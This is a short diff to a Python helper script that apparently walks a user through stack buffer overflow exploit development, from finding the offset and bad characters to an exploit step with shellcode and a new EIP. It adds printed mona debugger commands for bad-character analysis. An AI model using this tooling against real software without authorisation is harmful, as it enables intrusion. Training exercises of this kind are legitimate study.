@@ -61,7 +61,7 @@ def main():
     elif (action == 'offset'):
       script += f' -a verify -o {offset.decode("utf-8")}'
     elif (action == 'verify'):
-      script += f' -a chars -o {offset.decode("utf-8")} -x "<bytes_to_exclude>"'
+      script += f' -a chars -o {offset} -x "<bytes_to_exclude>"'
     elif (action == 'chars'):
       script += f' -a exploit -c /path/to/shellcode -r "new_eip"'
 
@@ -111,6 +111,10 @@ def main():
     except:
       print("[*] Check your debugger for a crash")
       print_next_posssible_command()
+      print("[*] If using mona, here are some valuable commands:")
+      print("    !mona config -set workingfolder c:\mona")
+      print('    !mona bytearray -b "\\x00"')
+      print("    !mona compare -f C:\mona\\bytearray.bin -a <address>")
 
   elif action == 'offset':
     if (query is None): raise Exception("[X] Must supply a query if using offset")
